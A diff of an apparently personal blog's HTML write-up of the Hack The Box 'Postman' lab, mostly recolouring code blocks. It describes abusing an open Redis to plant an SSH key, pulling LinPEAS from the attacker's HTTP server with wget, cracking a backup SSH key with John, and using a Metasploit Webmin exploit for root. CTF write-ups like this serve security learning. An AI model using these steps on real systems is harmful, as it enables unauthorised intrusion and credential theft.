-$ cat foo.txt | redis-cli -h 10.10.10.160 -x <span style="color:#fff;font-weight:bold">set</span> crackit
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ redis-cli -h 10.10.10.160 flushall
+$ cat foo.txt | redis-cli -h 10.10.10.160 -x <span style="color:#24909d">set</span> crackit
 </code></pre></div><p>Looks good. How to dump our memory content into the <code>authorized_keys</code> file? You can see what have I done in picture below.</p>
 <p><img src="/htb-postman/redis.png" alt="redis"></p>
 <p>Now that we’ve got a shell, we can see by running</p>
-<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat /etc/passwd
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat /etc/passwd
 </code></pre></div><p>that we have to gain access to Matt’s account.</p>
 <p>We can’t run anything as sudo and we don’t belong in any special groups. I searched the redis dir but there wasn’t anything we could work with, I went into <code>/var</code> and checked every folder and again, nothing we can work with. Let’s pull the big guns out. Big guns being LinPEAS. Let’s transfer them onto the server.</p>
 <p>Clone the repo to your machine, enter the <code>/linPEAS dir</code> and start an http server from there. I used port 1114.</p>
-<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo python -m SimpleHTTPServer <span style="color:#ff0;font-weight:bold">1114</span>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo python -m SimpleHTTPServer <span style="color:#3677a9">1114</span>
 </code></pre></div><p>Now, navigate to <code>/tmp</code> and create a dir there and cd into it (e.g. <code>/tmp/1234</code>), then grab the file from the machine.</p>
-<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ wget &lt;your ip here&gt;:1114/linpeas.sh
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ wget &lt;your ip here&gt;:1114/linpeas.sh
 </code></pre></div><p>Now I ran the script and spent some time looking at the output. This took some time but there is a <code>id_rsa.bak</code> file.</p>
 <p><img src="/htb-postman/id_rsa_bak.png" alt="id rsa bak"></p>
 <h3 id="cracking-ssh-key-with-john">Cracking ssh key with John</h3>
 <p>Simply pipe this into ssh2john.py and crack it with the rockyou.txt wordlist.</p>
 <p><img src="/htb-postman/john.png" alt="john"></p>
 <p>I tried to ssh into the server with this key but no success. So I connected again as redis and ran</p>
-<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ su Matt
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ su Matt
 </code></pre></div><p>And that’s how I got user</p>
-<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Matt@Postman:~$ cat user.txt 
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Matt@Postman:~$ cat user.txt 
 517ad...
 </code></pre></div><h2 id="getting-root">Getting root</h2>
 <p>Getting root is pretty easy, I just logged into webmin with <code>Matt</code> and <code>computer2008</code>. In there I couldn’t do anything, but we can see a notification that we have to update the software.</p>
 <h3 id="webmin-privilege-escalation">Webmin privilege escalation</h3>
 <p>I found an exploit on Metasploit and used it. Below are highlighted the options which are changed. Make sure to switch the payload as the default one didn’t work. I always have success in using the python one.</p>
-<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> &gt; show payloads
- &gt; <span style="color:#fff;font-weight:bold">set</span> payload &lt;payload here&gt;
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> &gt; show payloads
+ &gt; <span style="color:#24909d">set</span> payload &lt;payload here&gt;
 </code></pre></div><p><img src="/htb-postman/metasploit.png" alt="metasploit"></p>
 <p>After this you can simply type <code>exploit</code> and you should have a shell as root and you can <code>cat root.txt</code>.</p>
 ]]></content>
